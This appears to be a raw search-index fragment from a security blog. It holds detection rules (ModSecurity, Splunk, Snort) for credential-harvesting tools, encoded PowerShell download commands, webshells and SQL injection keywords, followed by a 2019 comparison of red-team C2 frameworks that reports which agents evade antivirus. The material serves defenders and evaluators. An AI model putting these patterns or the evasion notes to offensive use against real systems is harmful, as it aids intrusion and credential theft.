\"^[d.:]+$\" \"log,msg:'Host used an IP address'\"","title":"error.log visiting IP URL"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#errorlog-blank-ua","text":"SecRule REQUEST_HEADERS : User - Agent \"^$\" \"log,msg:'Request has blank UA'\"","title":"error.log blank UA"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#errorlog-ua-starting-with-mozilla","text":"SecRule REQUEST_HEADERS : User - Agent \"^mozilla\" \"log,msg:'Request has mozilla UA'\"","title":"error.log UA starting with mozilla"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#errorlog-visiting-by-ip-log-ua-used","text":"SecRule REQUEST_HEADERS : Host \" ^[d.:]+$ \" \" log,msg:'Host used an IP address check errorlog for UA',logdata:'User-Agent:%{REQUEST_HEADERS.User-Agent}' \"","title":"error.log visiting by IP log UA used"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#errorlog-no-ua-not-blank-but-none","text":"SecRule & REQUEST_HEADERS : User - Agent \"@eq 0\" \"log,msg:'Request missing UA',logdata:'User-Agent:%{REQUEST_HEADERS.User-Agent}'\"","title":"error.log no UA (not blank but none)"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#errorlog-note-param-entry","text":"SecRule & ARGS : password \"@gt 1\" \"log,msg:'PW data',logdata:'params:%{REQUEST_LINE}'\"","title":"error.log note param entry"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#errorlog-trigger-on-keyword-can-use-pattern","text":"# Trigger on EXFIL from body ( phase : 4 is the Response Body ) SecRule RESPONSE_BODY \"badguy\" \"phase:4, msg:'HoneyToken Exfil Detected', tag:'HONEYTOKEN EXFIL'\"","title":"error.log trigger on keyword (can use pattern)"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#splunk","text":"Note these are examples and are mainly illustrated as templates for creating your own internal searches","title":"Splunk"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#new-unauthorized-service","text":"index = windows LogName = System EventCode = 7045 NOT ( Service_Name =< yourscanner > ) | eval Message = split ( Message , \".\" ) | eval Short_Message = mvindex ( Message , 0 ) | table_time , host , Service_Name , Service_Type , Service_Start_Type , Service_Account , Short_Message","title":"New unauthorized service"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#detecting-process-abuse","text":"index = sysmon SourceType = \"WinEventLog:Microsoft-Windows-Sysmon/Operational\" ProcessCreate ( whoami OR netstat OR etc ) | search EventCode = 1 Image = \"*\\whoami.exe\" OR Image = \"* etstat.exe\" OR Image = \"* asklist.exe\" | bin ) time span = 5 m | rex field = Message \".*User:(xxx|NT AUTHORITY)\\(?<USER>.*)\" | stats dc ( Image ) AS CNT_CMDS values ( CommandLine ) values ( ParentImage ) values ( ParentCommandLine ) count by _time ComputerName USER","title":"Detecting process abuse"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#detecting-process-abuse-simplified-requires-one-entry-per-process","text":"index = sysmon Image = \"* et.exe\" ( CommandLine = \"*net group*\" OR CommandLine = \"*net localgroup*\" OR CommandLine = \"*net user*\" ) | stats count by Computer , CommandLine","title":"Detecting process abuse (simplified, requires one entry per process)"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#process-starts-and-connects-to-ip","text":"index = windows LogName = System EventCode = 5156 NOT ( Source_Address = \"10.10.10.15\" ) NOT ( Application_Name = \"path:file.exe\" ) | eval Message = split ( Message , \".\" ) | table_time , host , Application_Name , Source_Address , Destination_Address , Direction","title":"Process starts and connects to IP"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#detect-smb-traffic-between-clients","text":"index = sysmon SourceName = \"Microsoft-Windows-Sysmon\" EventCode = 3 Initiated = true SourceIp != DestinationIp DestinationPort = 445 Image != System ( SourceHostname = \"fileserver1\" DestinationHostname = \"client1\" ) OR ( Source_Address = \"10.10.1.5\" Destination_Address = \"10.10.10.15\" ) | stats by ComputerName ProcessGuid | fields ComputerName ProcessGuid","title":"Detect SMB traffic between clients"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#detect-named-pipes","text":"index = sysmon sourcetype = \"WinEventLog:Microsoft-Windows-Sysmon/Operational\" ( PipeEvent \"Pipe Created\" ) | search ( EventCode = 17 ( PipeName = \"\\*\" )) | stats values ( Image ) AS Images values ( PipeName ) AS PipeNames count by TaskCategory ComputerName","title":"Detect Named Pipes"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#detect-wmi","text":"index = sysmon Image = \"*\\WMIC.exe\" ( CommandLine = \"*process call create*\" OR CommandLine = \"*/NODE:*\" ) | stats count by Computer , CommandLine and index = sysmon ParentImage = \"*\\WmiPrvSE.exe\" | stats count by Computer , CommandLine","title":"Detect WMI"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#detect-powershell-commands","text":"index = sysmon ParentImage = \"*wsmprovhost.exe\" | stats count by Computer , CommandLine and index = sysmon Image = \" *powershell.exe \" ( CommandLine = \" *-EncodedCommand* \" OR CommandLine = \" *-Enc* \" OR CommandLine = \" *-e* \" OR CommandLine = \" *new-object* \" OR CommandLine = \" *-nop* \" OR CommandLine = \" *-noprofile \" OR CommandLine = \" *-Command* \" OR COmmandLine = \" *-c* \" OR CommandLine = \" *Invoke-Command* \" OR CommandLine = \" *download* \" OR CommandLine = \" *IEX* \" OR CommandLine = \" *exec* \" ) | stats count by Computer , CommandLine","title":"Detect PowerShell Commands"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#alert-on-remote-files-copied-via-cmd-line","text":"index = windows LogName = Security EventCode = 5145 Object_Type = File Share_Name =* $ ( Access_Mask = 0 x100180 OR Access_Mask = 0 x80 OR Access_Mask = 0 x130197 ) | bucket span = 1 s _time | rex \"(?(0x100180|0x80|0x130197))\" | stats values ( Relative_Target_Name ) AS Relative_Target_Name , values ( Account_Name ) AS Account_Name , values ( Source_Address ) AS Source_Address , dc ( thingtype ) AS distinct_things by ComputerName , _time | search distinct_things = 3","title":"Alert on remote files copied via cmd line"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#alert-on-c-or-admin-share-enumeration","text":"index = windows LogName = Security EventCode = 5145 Share_Name =* c $ OR * ADMIN $ ( Access_Mask = 0 x100180 ) NOT ( Source_Address = \"10.10.10.15\" ) | bucket span = 1 s _time | rex \"(?(0x100180))\" | stats values ( Relative_Target_Name ) AS Relative_Target_Name , values ( Account_Name ) AS Account_Name , values ( Source_Address ) AS Source_Address , dc ( thingtype ) AS distinct_things by ComputerName , _time | search distinct_things = 3","title":"Alert on C or Admin share enumeration"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#search-for-file-delivery","text":"index = sysmon SourceName = \"Microsoft-Windows-Sysmon\" FileCreateStreamHash badfile . exe | search EventCode = 15 | rex field = TargetFilename \".*\\(?<TargFilename>[^\\]*)\" | rex field = Image \".*\\(?<ImageFilename[^\\]*)\" | rex field = Hash \".*MD5=(?<MD5>[A-F0-9]*),IMPHASH=(?<IMPHASH>[A-F0-9]*)\" | stats values ( TargFilename ) values ( ComputerName ) AS Clients count by TaskCategory ImageFilename MD5","title":"Search for file delivery"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#search-for-registry-run-or-runonce-keys","text":"index = sysmon SourceName = \"Microsoft-Windows-Sysmon\" RegistryEvent CurrentVersion Run | search EventCode = 13 \"*\\Windows\\CurrentVersion\\Run*\" | rex field = Image \".*\\(?Image_EXE>[^\\]*)\" | rex field = TargetObject \".*\\CurrentVersion\\(?<TargetObj_PATH>.*)\" | strcat \"Image=\"\" IMage_EXE \"\", TargetObject=\"\" TargetObj_PATH \"\", Details=\"\" Details \"\"\" Image_TargetObj_Details | stats dc ( ComputerName ) AS Clients values ( Image_TragetObj_Details ) count by TaskCategory Image_EXE","title":"Search for Registry Run (or RunOnce) Keys"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#search-for-file-system-persistence","text":"index = sysmon SourceName = \"Microsoft-Windows-Sysmon\" ProcessCreate \"Start Menu\" Programs Startup | search Image = \"*\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\*\" | rex field = Image \".*\\Programs\\Startup\\(?<Startup_Image>[^\\]*)\" | rex field = Hash \".*MD5=(?<MD5>[A-F0-9]*),IMPHASH=(?<IMPHASH>[A-F0-9]*)\" | stats values ( ComputerName ) AS Clients vlaues ( MD5 ) count by IMPHASH Startup_Image","title":"Search for file system persistence"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#detect-credential-harvesting","text":"index = sysmon ParentImage = \"*\\services.exe\" | regex CommandLine = \"\\[a-z0-9]{8}-[a-z0-9]{4}-[az0-9]{4}-[a-z0-9]{4}-[a-z0-9]{12}.exe-S$\" and index = sysmon CommandLine = \"*privileges::debug*\" OR CommandLine = \"*sekurlsa::*\" OR CommandLine = \"*kerberos::*\" OR CommandLine = \"*crypto::*\" OR CommandLine = \"*lsadump::*\" OR CommandLine = \"*process::*\"","title":"Detect credential harvesting"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#potential-privilege-escalation","text":"index = sysmon sourcetype = \"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode = 4688 Token_Elevation_Type = \"*(2)\"","title":"Potential Privilege Escalation"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#potential-beaconing-detection","text":"index = proxy sourcetype = bluecoat : proxysg : access : syslog url =* | eval current_time = _time | sort 0 + current_time | streamstats global = f window = 2 current = f last ( current_time ) AS previous_time by src , url | eval diff_time = current_time - previous_time | eventstats count , stdev ( diff_time ) AS std by src , url","title":"Potential Beaconing Detection"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#detect-webshell-activity-note-this-should-be-updated-at-implementation-and-often","text":"index = sysmon ParentImage = \"*\u0007pache*\" ParentImage = \"* omcat*\" ParentImage = \"* ginx*\" ParentImage = \"*\\httpd*\" ParentImage = \"*\\php-cgi*\" ParentImage = \"*\\w3wp*\" CommandLine = \"*whoami*\" CommandLine = \"*net*\" CommandLine = \"*ipconfig*\" CommandLine = \"*hostname*\" CommandLine = \"*systeminfo*\" CommandLine = \"*cmd*\" CommandLine = \"*sh*\" CommandLine = \"*bash*\" CommandLine = \"*powershell*\"","title":"Detect webshell activity (note this should be updated at implementation and often)"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#detect-potential-sqli","text":"index = weblogs sourcetype = MSWindows : 2008 R2 : IIS | regex cs_uri_query= \"(?i)(?:--|;|/*|@|@@version|char|alter|begin|cast|create|cursor|declare|delete|drop|end|exec|fetch|insert|kill|open|select|sys|table|update)\" | stats count by host c_ip cs_uri_stem cs_uri_query | rex field = cs_uri_query \"(?i)(?<suspect>--|;|/*|@|@@version|char|alter|begin|cast|create|cursor|declare|delete|drop|end|exec|fetch|insert|kill|open|select|sys|table|update)\" max_match = 0","title":"Detect potential SQLi"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#view-http-post-with-response","text":"index = json_bro eventtype = bro_http method = POST AND status <= 403 AND uri =* . php OR uri =* . jsp OR uri =* . cfm OR uri =* . asp OR uri =* . aspx | stats values ( id . orig_h ) AS Source , values ,( hostname ) AS Destination by uri","title":"View HTTP POST with response"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#find-weird-user-agents","text":"index = json_bro eventtype - bro_http | stats count by user_agent | sort - count | reverse","title":"Find Weird User-Agents"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#get-high-severity-epo-events","text":"index = av sourcetype = mcafee : epo ( severity = critical OR severity = high ) | stats values ( event_description ) AS desc , values ( signature ) AS signature , values ( file_name ) AS file_path , count AS result BY dest | eval dd = \"index=av sourcetype=mcafee:epo (severity=critical OR severity=high) dest=\" . dest","title":"Get high severity EPO events"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#snort","text":"Note these are examples and are mainly illustrated as templates for creating your own internal searches","title":"Snort"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#detect-psexec","text":"alert tcp any any - > $ HOME_NET [ 139 , 445 ] ( msg : \"ET POLICY PsExec? service created\" ; flow : to_server , established ; content : \"5c 00 50 00 53 00 45 00 58 00 45 00 53 00 56 00 43 00 2e 00 45 00 58 00 45\" ; reference : url , xinn . org / Snort-psexec . html ; reference : url , doc . emerginthreats . net / 2010781 : classtype : suspicious-filename-detect : sid : 201781 ; rev : 2 ;)","title":"Detect psexec"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#detect-packets-with-with-port-4444-port-0","text":"alert tcp $ EXTERNAL_NET any <> $ HOME_NET 4444 ( msg : \"BAD-TRAFFIC tcp port 4444 traffic\" ; flow : stateless ; classtype : misc-activity ; sid : 524 ; rev : 8 ;) \"","title":"Detect packets with with port 4444 (port 0?)"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#snort-appid-list","text":"sudo u2openappid / var / log / snort / appstats - unified . log . 1455060958 | egrep - v '\"http\"|\"https\"|\"dns\"|\"internet_explor\"' | cut - d \",\" - f2 | sort | uniq - c | sort - nr","title":"Snort appid list"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#interesting-file-extensions-note-this-is-the-same-list-as-above-placed-here-for-use-in-monitoring-via-snort","text":".ade , .adp , .ani , .bas , .bat , .chm , .cmd , .com , .cpl , .crt , .exe , .hlp , .ht , .hta , .inf , .ins , .isp , .jar , .job , .js , .jse , .lnk , .mda , .mdb , .mde , .mdz , .msc , .msi , .msp , .mst , .ocx , .pcd , .ps1 , .reg , .scr , .sct , .shs , .svg , .url , .vb , .vbe , .vbs , .wbk , .wsc , .ws , .wsf , .wsh , .exe , .pif , .pub , .ip","title":"Interesting file extensions (Note this is the same list as above, placed here for use in monitoring via Snort)"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#additional-useful-info","text":"","title":"Additional Useful Info"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#get-methods-from-accesslog","text":"cat access . log | cut - d \" - f2 | cut - d ' ' - f1 | sort - u","title":"Get methods from access.log"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#decode-encoded-url-line-290","text":"awk ' {if (length($0) > max){max=length($0);maxline=$0}} END {print maxline } ' access . log | cut - d \" \" - f7 | sed s /%// g | sed s /+// g | sed s / ? // g | xxd - r - p or cat access . log | grep POST | grep cgi - bin | cut - d '\"' - f2 | sort - u | sed s /%// g | sed s /+// g | cut - d \"?\" - f2 | awk - F \"HTTP/1.1\" '{print $1}' | xxd - r - p","title":"Decode %encoded url (line 290)"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#gather-information-on-windows-host","text":"","title":"Gather Information on Windows host"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#list-task-services","text":"tasklist / svc / fi \"imagename eq file.exe\"","title":"List task services"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#show-modules-for-task","text":"tasklist / m / fi \"imagename eq file.exe\"","title":"Show modules for task"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#verbose-task-information","text":"tasklist / v / fi \"imagename eq file.exe\"","title":"Verbose task information"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#get-information-about-processes","text":"get - wmiobject - class Win32_Process - Filter 'Name=\"file.exe\"' and get-process | select * |Where-Object { $_.ID - eq PID } and gwmi Win32_Process|Select ProcessName,ProcessID,ParentProcessID,CommandLine,@ { e = { $_.GetOwner (). User }} |ft -wrap;netstat ano","title":"Get information about processes"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#look-for-code-injected-into-memory","text":"Get - InjectedThread . ps1 Reference \u2013 https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2","title":"Look for code injected into memory"},{"location":"blogs/2019/c2-agent-comparison/","text":"C2 Agent Comparison (AUG2019) \u00b6 James Tubberville | August 28, 2019 | Tweet This Post: I was recently asked to perform an evaluation of multiple command and control (C2) agents. Rather than spending an exorbitant amount of time (that could be used building a custom C2) on an evaluation, I decided to perform a quick comparison of several popular C2 agents. Systems for testing included Ubuntu 16.04, Ubuntu 18.04, MacOS 10.14.6, and Windows 10 (Defender, CrowdStrike, Tanium, McAfee, and a custom defense agent) all fully patched and updated as of August 19,2019. This comparison is in no way a complete review, evaluation, or judgment on the validity of any agent. Rather it is a very quick assessment of my first take on each (think hours not months). I also acknowledge that if a function, feature, or build did not work after two consecutive attempts it was abandoned. All readers should note that building a C2 agent or framework isn't easy. Building one that can handle the types of actions a true Red Team may perform while avoiding defensive mechanisms or processes and ensuring effective functionality is tough! Kudos to each of the authors! C2 Comparison Matrices \u00b6 Name License Purpose Platforms Supported Project Language Docker Collaborative Link Apfell BSD3 Post-Exp Cross python Yes Yes https://github.com/its-a-feature/Apfell Cobalt Strike Commercial Multi Win Sleep Yes Yes https://www.cobaltstrike.com/ Covenant GNU GPL3 Post-Exp Cross C# (.NET) Yes Yes https://github.com/cobbr/Covenant Empire BSD3 Post-Exp Cross Python Yes No https://github.com/EmpireProject/Empire Faction BSD3 Post-Exp Multi Python Yes Yes https://github.com/FactionC2/Faction iBombshell GNU GPL3 Post-Exp Win Powershell Yes No https://github.com/ElevenPaths/ibombshell Koadic Apache 2 Post-Exp Win VBScript/JScript No https://github.com/zerosum0x0/koadic Merlin GNU GPL3 Post-Exp Cross Go No No https://github.com/Ne0nd0g/merlin Pinjectra BSD3 ProcInj Win C+ NA NA https://github.com/SafeBreach-Labs/pinjectra PoshC2 BSD3 Post-Exp Cross Powershell/Python No Limited https://github.com/nettitude/PoshC2_Python Sliver GNU GPL3 Post-Exp Cross Go Yes No https://github.com/BishopFox/sliver Silentrinity GNU GPL3 Post-Exp Multi Python No Yes https://github.com/byt3bl33d3r/SILENTTRINITY Trevor C2 WTH Post-Exp Multi Python/Powershell Yes No https://github.com/trustedsec/trevorc2 Note: I\u2019ve identified differences between multi and cross platform. Cross supports some combination of Windows, Linux, and/or Mac natively. Multi indicates the ability to (easily) write agents to support other platforms. (In this context Cross is better :)) Name Cmd Exec Script Exec Pivot Cmds Traffic Fwd File Upload File Download Credential Gathering Token Manipulation Session Pivoting Malleable C2 Memory or Disk Resident MITRE ATT&CK Apfell x x - - x x L - - x D x Cobalt Strike x x x L x x x x x x M or D x Covenant x x x L x x x x - x M or D - Empire x x - - x x x x - x M or D x Faction x x x L x x - - - x D (M?) x iBombshell x x x L x x x x - With effort M - Koadic x x B L x x x L - - M or D - Merlin x x x L x x x L x x D Pinjectra PoshC2 x x - L x x x x - x D x Sliver x x - - x x - L - L D Silenttrinity L L L L x L x - exit L D Trevor C2 x x - - - - - - x L D Description: Cmd Exec - Execution of host cmds with switches via console Script Exec - Execution of various scripts from console Pivot Cmds - Ability to natively relay cmds to lateral systems via console Traffic Fwd - Ability to natively relay traffic to lateral systems via console File Upload/Download - Ability to place and pull files via console Cred Gathering - Ability to pull credentials (plaintext|hash|tokens) from host via console Token Manipulation - Ability to create and/or send tokens to host or lateral system via console Session Pivoting - Ability to fwd specific session types (web, application, etc.) to lateral systems via console Legend: X- Yes L - Limited B - By using a binary - - No (or not native) Apfell \u00b6 Code : Python https://github.com/its-a-feature/Apfell License: BSD-3 Pros: Python Extensible code base Crossplatform Docker Web UI JavaScript for Automation (Mac OS) Chrome Extension Payload Very Cobalt Strike(ish) Reporting (Artifacts, ATT&CK Mapping, PDF of Tasks) Cons: Python 2.7 or multiple errors RabbitMQ Lots of \u201cToDos\u201c and feature changes planned Cobalt Strike \u00b6 Code : Sleep https://www.cobaltstrike.com/ License: Commercial Pros: Collaborative Well tested Highly capable Recon, Phishing, Post-Exp, Browser Pivoting, C2, Reporting Kits for extensibility https://www.cobaltstrike.com/help-externalc2 https://github.com/xorrior/raven Cons: Windows Specific PO problems Mods require custom kits or sleep builds Covenant \u00b6 Code: C# https://github.com/cobbr/Covenant License: GNU GPL3 Pros: Extensible code base (with exp) Multi-User Crossplatform Docker Web UI Chrome Extension Payload Many Cobalt Strike similarities Cons: Written in C# Only HTTP(s) listeners Constructing complex Tasks can be annoying (if not time consuming) Empire \u00b6 Code: Python https://github.com/EmpireProject/Empire License: BSD3 Pros: Multi-platform Written in python Versatile Cons: Poor documentation (good at the time but outdated) Poor logging End of Life Often buggy Faction \u00b6 Code: https://github.com/FactionC2/Faction License: BSD3 Pros: Micro Service Architecture Extensible Communicates via message queues (JSON based) Fully functional API (API required) Crossplatform Rest and Socket.IO RBAC SQL Query Capable WebUI Cons: Relies on RabbitMQ Buggy Limited review Unproven Disk (states single line exec, but none worked in testing) No native AV evasion States it\u2019s a PoC so may be further dev\u2019d or dropped iBombshell \u00b6 Code: https://github.com/ElevenPaths/ibombshell License: GNU GPL3 Pros: Memory Resident Modules can be written easily (PS) Build based on Metasploit Cons: Buggy, buggy, buggy! PowerShell (Req PS 3.0^) Windows (Partially supports linux with PS and python) Limited review Base Framework flags AV Koadic \u00b6 Code: https://github.com/zerosum0x0/koadic License: Apache 2 Pros: PowerShell Based on Metasploit (need MSF for full use) Easily track domain users vs admins Cons: Windows Only PowerShell Limited maintenance Limited review Requires cleartext creds for sessions or tokens (no keys/PTH/Kerb/etc) Base flags AV Merlin \u00b6 Code: https://github.com/Ne0nd0g/merlin License: GNU GPL3 Pros: Cross Platform Extensible HTTP/2 Metasploit Similarities Leverages multiple known proven modules Cons: Buggy Limited review Requires binaries/file loads to disk Limited capability for mem resident (recompile is buggy) No native AV obfuscation Significant dll mods to avoid AV Pinjectra \u00b6 Code: https://github.com/SafeBreach-Labs/pinjectra License: BSD3 Pros: TBD Cons: Not C2 TBD PoshC2 \u00b6 Code: https://github.com/nettitude/PoshC2_Python License: BSD3 Pros: PowerShell Python Cross Platform Metasploit Styled Config controls all settings Cons: Disk based No native AV obfuscation Payloads generated at server instantiation Single user console (additional consoles requires hole in fw for access unless on common port i.e. those you want for OPS) Separate server and console screens Sliver \u00b6 Code: https://github.com/BishopFox/sliver License: GNU GPL3 Pros: Crossplatform Anit-forensics (? Untested) Attempts to enforce good OPSEC Agents will reconnect if proc crash (within given timeframe) Agent info provided during profile generation Stable so far (no unvalidated crashes) Did not produce any alerts Native builds did not flag AV (Defender, CrowdStrike, Tanium. McAfee) Cons: In Alpha Limited review Limited capabilities Generating with symbols takes a while (requires additional memory on server) Proc crashes if memory overrun (need several GB for generation) Generating without symbols is fast but is less obfuscated Cannot change callback timing Nearly interactive No logging Last check-in was not accurate in testing Silenttrinity \u00b6 Code: https://github.com/byt3bl33d3r/SILENTTRINITY License: GNU GPL3 Pros: Crossplatform Collaborative All actions logged Recently rewritten Cons: Recently rewritten HTTP/1.1 Limited review TrevorC2 \u00b6 Code: https://github.com/trustedsec/trevorc2 License: WTH Pros: Does not use POST for exfil Mirrors chosen site for use Simple Interface Traffic looks like legit web (b64 to initial viewing) Can be used across platforms Alternates callback intervals Notes indicate future dev Cons: Extremely limited Console has limited native functionality Looks like a project idea that hasn't taken off quite yet Results \u00b6 Of the 12 C2 listed, none are viable for my needs in long-term operations. Several have benefits for short-term OPS; however, drawbacks must be weighed against operational objectives. Cobalt Strike is extremely useful and viable for Windows based operations or if used in conjunction with a second C2. If 2 were required outside Cobalt Strike, Sliver would be my first and Faction second choices with very specific use cases for each.","title":"C2 Agent Comparison"},{"location":"blogs/2019/c2-agent-comparison/#c2-agent-comparison-aug2019","text":"James Tubberville | August 28, 2019 | Tweet This Post: I was recently asked to perform an evaluation of multiple command and control (C2) agents. Rather than spending an exorbitant amount of time (that could be used building a custom C2) on an evaluation, I decided to perform a quick comparison of several popular C2 agents. Systems for testing included Ubuntu 16.04, Ubuntu 18.04, MacOS 10.14.6, and Windows 10 (Defender, CrowdStrike, Tanium, McAfee, and a custom defense agent) all fully patched and updated as of August 19,2019. This comparison is in no way a complete review, evaluation, or judgment on the validity of any agent. Rather it is a very quick assessment of my first take on each (think hours not months). I also acknowledge that if a function, feature, or build did not work after two consecutive attempts it was abandoned. All readers should note that building a C2 agent or framework isn't easy. Building one that can handle the types of actions a true Red Team may perform while avoiding defensive mechanisms or processes and ensuring effective functionality is tough! Kudos to each of the authors!","title":"C2 Agent Comparison (AUG2019)"},{"location":"blogs/2019/c2-agent-comparison/#c2-comparison-matrices","text":"Name License Purpose Platforms Supported Project Language Docker Collaborative Link Apfell BSD3 Post-Exp Cross python Yes Yes https://github.com/its-a-feature/Apfell Cobalt Strike Commercial Multi Win Sleep Yes Yes https://www.cobaltstrike.com/ Covenant GNU GPL3 Post-Exp Cross C# (.NET) Yes Yes https://github.com/cobbr/Covenant Empire BSD3 Post-Exp Cross Python Yes No https://github.com/EmpireProject/Empire Faction BSD3 Post-Exp Multi Python Yes Yes https://github.com/FactionC2/Faction iBombshell GNU GPL3 Post-Exp Win Powershell Yes No https://github.com/ElevenPaths/ibombshell Koadic Apache 2 Post-Exp Win VBScript/JScript No https://github.com/zerosum0x0/koadic Merlin GNU GPL3 Post-Exp Cross Go No No https://github.com/Ne0nd0g/merlin Pinjectra BSD3 ProcInj Win C+ NA NA https://github.com/SafeBreach-Labs/pinjectra PoshC2 BSD3 Post-Exp Cross Powershell/Python No Limited https://github.com/nettitude/PoshC2_Python Sliver GNU GPL3 Post-Exp Cross Go Yes No https://github.com/BishopFox/sliver Silentrinity GNU GPL3 Post-Exp Multi Python No Yes https://github.com/byt3bl33d3r/SILENTTRINITY Trevor C2 WTH Post-Exp Multi Python/Powershell Yes No https://github.com/trustedsec/trevorc2 Note: I\u2019ve identified differences between multi and cross platform. Cross supports some combination of Windows, Linux, and/or Mac natively. Multi indicates the ability to (easily) write agents to support other platforms. (In this context Cross is better :)) Name Cmd Exec Script Exec Pivot Cmds Traffic Fwd File Upload File Download Credential Gathering Token Manipulation Session Pivoting Malleable C2 Memory or Disk Resident MITRE ATT&CK Apfell x x - - x x L - - x D x Cobalt Strike x x x L x x x x x x M or D x Covenant x x x L x x x x - x M or D - Empire x x - - x x x x - x M or D x Faction x x x L x x - - - x D (M?) x iBombshell x x x L x x x x - With effort M - Koadic x x B L x x x L - - M or D - Merlin x x x L x x x L x x D Pinjectra PoshC2 x x - L x x x x - x D x Sliver x x - - x x - L - L D Silenttrinity L L L L x L x - exit L D Trevor C2 x x - - - - - - x L D Description: Cmd Exec - Execution of host cmds with switches via console Script Exec - Execution of various scripts from console Pivot Cmds - Ability to natively relay cmds to lateral systems via console Traffic Fwd - Ability to natively relay traffic to lateral systems via console File Upload/Download - Ability to place and pull files via console Cred Gathering - Ability to pull credentials (plaintext|hash|tokens) from host via console Token Manipulation - Ability to create and/or send tokens to host or lateral system via console Session Pivoting - Ability to fwd specific session types (web, application, etc.) to lateral systems via console Legend: X- Yes L - Limited B - By using a binary - - No (or not native)","title":"C2 Comparison Matrices"},{"location":"blogs/2019/c2-agent-comparison/#apfell","text":"Code : Python https://github.com/its-a-feature/Apfell License: BSD-3 Pros: Python Extensible code base Crossplatform Docker Web UI JavaScript for Automation (Mac OS) Chrome Extension Payload Very Cobalt Strike(ish) Reporting (Artifacts, ATT&CK Mapping, PDF of Tasks) Cons: Python 2.7 or multiple errors RabbitMQ Lots of \u201cToDos\u201c and feature changes planned","title":"Apfell"},{"location":"blogs/2019/c2-agent-comparison/#cobalt-strike","text":"Code : Sleep https://www.cobaltstrike.com/ License: Commercial Pros: Collaborative Well tested Highly capable Recon, Phishing, Post-Exp, Browser Pivoting, C2, Reporting Kits for extensibility https://www.cobaltstrike.com/help-externalc2 https://github.com/xorrior/raven Cons: Windows Specific PO problems Mods require custom kits or sleep builds","title":"Cobalt Strike"},{"location":"blogs/2019/c2-agent-comparison/#covenant","text":"Code: C# https://github.com/cobbr/Covenant License: GNU GPL3 Pros: Extensible code base (with exp) Multi-User Crossplatform Docker Web UI Chrome Extension Payload Many Cobalt Strike similarities Cons: Written in C# Only HTTP(s) listeners Constructing complex Tasks can be annoying (if not time consuming)","title":"Covenant"},{"location":"blogs/2019/c2-agent-comparison/#empire","text":"Code: Python https://github.com/EmpireProject/Empire License: BSD3 Pros: Multi-platform Written in python Versatile Cons: Poor documentation (good at the time but outdated) Poor logging End of Life Often buggy","title":"Empire"},{"location":"blogs/2019/c2-agent-comparison/#faction","text":"Code: https://github.com/FactionC2/Faction License: BSD3 Pros: Micro Service Architecture Extensible Communicates via message queues (JSON based) Fully functional API (API required) Crossplatform Rest and Socket.IO RBAC SQL Query Capable WebUI Cons: Relies on RabbitMQ Buggy Limited review Unproven Disk (states single line exec, but none worked in testing) No native AV evasion States it\u2019s a PoC so may be further dev\u2019d or dropped","title":"Faction"},{"location":"blogs/2019/c2-agent-comparison/#ibombshell","text":"Code: https://github.com/ElevenPaths/ibombshell License: GNU GPL3 Pros: Memory Resident Modules can be written easily (PS) Build based on Metasploit Cons: Buggy, buggy, buggy! PowerShell (Req PS 3.0^) Windows (Partially supports linux with PS and python) Limited review Base Framework flags AV","title":"iBombshell"},{"location":"blogs/2019/c2-agent-comparison/#koadic","text":"Code: https://github.com/zerosum0x0/koadic License: Apache 2 